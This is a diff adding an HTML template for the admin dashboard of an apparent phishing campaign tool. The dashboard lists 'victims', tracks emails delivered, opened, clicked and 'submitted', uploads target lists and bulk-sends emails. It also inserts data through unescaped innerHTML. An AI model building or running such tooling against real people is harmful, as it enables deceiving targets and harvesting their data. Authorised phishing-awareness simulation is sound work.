@@ -1,0 +1,180 @@
+{% extends "base.html" %}
+
+{% block title %}Admin Dashboard{% endblock %}
+
+{% block content %}
+<div class="container mt-5">
+    <h1 class="mb-4">Analytics</h1>
+    <div class="row mb-4">
+        <div class="col-md-3">
+            <div class="card text-white bg-primary mb-3">
+                <div class="card-body">
+                    <h5 class="card-title">All Records</h5>
+                    <p class="card-text" id="total-records">0</p>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="card text-white bg-success mb-3">
+                <div class="card-body">
+                    <h5 class="card-title">Delivered</h5>
+                    <p class="card-text" id="sent-records">0</p>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-2">
+            <div class="card text-white bg-info mb-3">
+                <div class="card-body">
+                    <h5 class="card-title">Opened</h5>
+                    <p class="card-text" id="opened-records">0</p>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="card text-white bg-warning mb-3">
+                <div class="card-body">
+                    <h5 class="card-title">Clicked</h5>
+                    <p class="card-text" id="clicked-records">0</p>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="card text-white bg-danger mb-3">
+                <div class="card-body">
+                    <h5 class="card-title">Submitted</h5>
+                    <p class="card-text" id="submitted-records">0</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <form id="upload-form" enctype="multipart/form-data">
+        <div class="mb-3">
+            <label for="file-input" class="form-label">Dosya Yükle</label>
+            <input class="form-control" type="file" id="file-input" name="file">
+        </div>
+        <button type="button" class="btn btn-primary" onclick="startUpload()">Start</button>
+        <button type="button" class="btn btn-warning" onclick="sendAllEmails()">Send All Emails</button>
+    </form>
+    <table class="table table-bordered mt-4">
+        <thead>
+            <tr>
+                <th>Token</th>
+                <th>Name</th>
+                <th>Surname</th>
+                <th>Email</th>
+                <th>Status</th>
+                <th>Department</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody id="victim-table-body">
+            <!-- Data will be populated by JavaScript -->
+        </tbody>
+    </table>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        fetchVictims();
+        fetchAnalytics();
+    });
+
+    async function fetchVictims() {
+        try {
+            const response = await axios.get('/api/victims');
+            const victims = response.data;
+            const tableBody = document.getElementById('victim-table-body');
+            tableBody.innerHTML = '';
+
+            victims.forEach(victim => {
+                const row = document.createElement('tr');
+
+                row.innerHTML = `
+                    <td>${victim.token}</td>
+                    <td>${victim.name}</td>
+                    <td>${victim.surname}</td>
+                    <td>${victim.email}</td>
+                    <td>${victim.status}</td>
+                    <td>${victim.department}</td>
+                    <td>
+                        <a href="/victim_info?token=${victim.token}" class="btn btn-info">Get Information</a>
+                        <button class="btn btn-warning" onclick="sendEmail('${victim.token}')">Send Email</button>
+                    </td>
+                `;
+                tableBody.appendChild(row);
+            });
+        } catch (error) {
+            console.error('Error fetching victims:', error);
+        }
+    }
+
+    async function fetchAnalytics() {
+        try {
+            const response = await axios.get('/api/analytics');
+            const analytics = response.data;
+
+            document.getElementById('total-records').innerText = analytics.total_records;
+            document.getElementById('sent-records').innerText = analytics.sent_records;
+            document.getElementById('opened-records').innerText = analytics.num_of_opened;
+            document.getElementById('clicked-records').innerText = analytics.num_of_clicked;
+            document.getElementById('submitted-records').innerText = analytics.num_of_submitted;
+        } catch (error) {
+            console.error('Error fetching analytics:', error);
+        }
+    }
+
+    async function startUpload() {
+        const fileInput = document.getElementById('file-input');
+        const formData = new FormData();
+        formData.append('file', fileInput.files[0]);
+
+        try {
+            const response = await axios.post('/api/upload', formData, {
+                headers: {
+                    'Content-Type': 'multipart/form-data'
+                }
+            });
+            if (response.status === 200) {
+                alert('File uploaded successfully!');
+                fetchVictims();
+                fetchAnalytics();
+            } else {
+                alert('File upload failed!');
+            }
+        } catch (error) {
+            console.error('Error uploading file:', error);
+            alert('File upload failed!');
+        }
+    }
+
+    async function sendEmail(token) {
+        try {
+            const response = await axios.get(`/api/send_email/?token=${token}`);
+            if (response.status === 200) {
+                alert('Email sent successfully!');
+            } else {
+                alert('Failed to send email.');
+            }
+        } catch (error) {
+            console.error('Error sending email:', error);
+            alert('Failed to send email.');
+        }
+    }
+
+    async function sendAllEmails() {
+    try {
+        const response = await axios.post('/api/send_emails_to_all_victims/');
+        if (response.status === 200) {
+            alert('All emails sent successfully!');
+        } else {
+            alert('Failed to send emails.');
+        }
+    } catch (error) {
+        console.error('Error sending all emails:', error);
+        alert('Failed to send emails.');
+    }
+}
+
+</script>
+{% endblock %}
